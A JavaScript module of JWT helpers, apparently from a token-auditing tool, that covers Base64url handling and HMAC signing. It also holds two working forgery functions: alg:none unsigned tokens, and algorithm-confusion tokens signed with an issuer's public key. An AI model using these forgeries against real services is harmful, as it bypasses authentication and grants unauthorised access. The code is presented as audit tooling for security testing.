// Client-side JWT primitives: Base64url handling, HMAC signing and token crafting.
// Used by the audit probes (alg:none, algorithm confusion) and the dictionary cracker.
// Nothing here sends the token or the candidate secrets to the server.

const encoder = new TextEncoder();
const decoder = new TextDecoder("utf-8", { fatal: false });

export function base64UrlToBytes(value) {
  const normalized = value.replace(/-/g, "+").replace(/_/g, "/");
  const padded = normalized + "=".repeat((4 - (normalized.length % 4)) % 4);
  const binary = atob(padded);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i += 1) bytes[i] = binary.charCodeAt(i);
  return bytes;
}

export function base64UrlFromBytes(bytes) {
  let binary = "";
  for (let i = 0; i < bytes.length; i += 1) binary += String.fromCharCode(bytes[i]);
  return btoa(binary).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

export function encodeSegment(value) {
  return base64UrlFromBytes(encoder.encode(JSON.stringify(value)));
}

export function decodeSegment(segment) {
  return JSON.parse(decoder.decode(base64UrlToBytes(segment)));
}

export function splitToken(token) {
  const trimmed = (token || "").trim();
  const parts = trimmed.split(".");
  if (parts.length !== 3) return null;
  return { header: parts[0], payload: parts[1], signature: parts[2], signingInput: `${parts[0]}.${parts[1]}` };
}

export function decodeToken(token) {
  const parts = splitToken(token);
  if (!parts) return null;
  try {
    return {
      ...parts,
      header: JSON.parse(decoder.decode(base64UrlToBytes(parts.header))),
      payload: JSON.parse(decoder.decode(base64UrlToBytes(parts.payload))),
    };
  } catch {
    return null;
  }
}

export const HASH_BY_ALG = { HS256: "SHA-256", HS384: "SHA-384", HS512: "SHA-512" };

// RFC 2104 pads a short key to the block size with zero bytes, so HMAC with an
// empty key is identical to HMAC with an all-zero block. WebCrypto rejects
// zero-length import keys, so represent the empty secret as that zero block.
const HMAC_BLOCK_BYTES = { "SHA-256": 64, "SHA-384": 128, "SHA-512": 128 };

export function hmacKeyBytes(alg, secret) {
  const bytes = encoder.encode(secret);
  if (bytes.length > 0) return bytes;
  return new Uint8Array(HMAC_BLOCK_BYTES[HASH_BY_ALG[alg]]);
}

export function webCryptoAvailable() {
  return typeof crypto !== "undefined" && Boolean(crypto.subtle);
}

async function hmacKey(alg, secretBytes) {
  return crypto.subtle.importKey(
    "raw",
    secretBytes,
    { name: "HMAC", hash: HASH_BY_ALG[alg] },
    false,
    ["sign"],
  );
}

// Returns the Base64url signature for signingInput, or null when the algorithm
// is not an HMAC variant or WebCrypto is unavailable.
export async function hmacSign(alg, secret, signingInput) {
  const hash = HASH_BY_ALG[alg];
  if (!hash || !webCryptoAvailable()) return null;
  try {
    const key = await hmacKey(alg, hmacKeyBytes(alg, secret));
    const signature = await crypto.subtle.sign("HMAC", key, encoder.encode(signingInput));
    return base64UrlFromBytes(new Uint8Array(signature));
  } catch {
    return null;
  }
}

// Length-independent, content-constant-time comparison of two Base64url strings.
export function constantTimeEqual(a, b) {
  if (typeof a !== "string" || typeof b !== "string") return false;
  // Compare on equal-length windows so length alone does not short-circuit.
  let diff = a.length ^ b.length;
  const len = Math.min(a.length, b.length);
  for (let i = 0; i < len; i += 1) diff |= a.charCodeAt(i) ^ b.charCodeAt(i);
  return diff === 0;
}

export function forgeUnsignedToken(payload, header = { alg: "none", typ: "JWT" }) {
  return `${encodeSegment(header)}.${encodeSegment(payload)}.`;
}

// The classic algorithm-confusion forgery: an HS* signature computed with the
// issuer's RSA/EC *public* key as the shared secret.
export async function forgeConfusionToken(payload, publicKey, alg = "HS256") {
  const signingInput = `${encodeSegment({ alg, typ: "JWT" })}.${encodeSegment(payload)}`;
  const signature = await hmacSign(alg, publicKey, signingInput);
  if (!signature) return null;
  return `${signingInput}.${signature}`;
}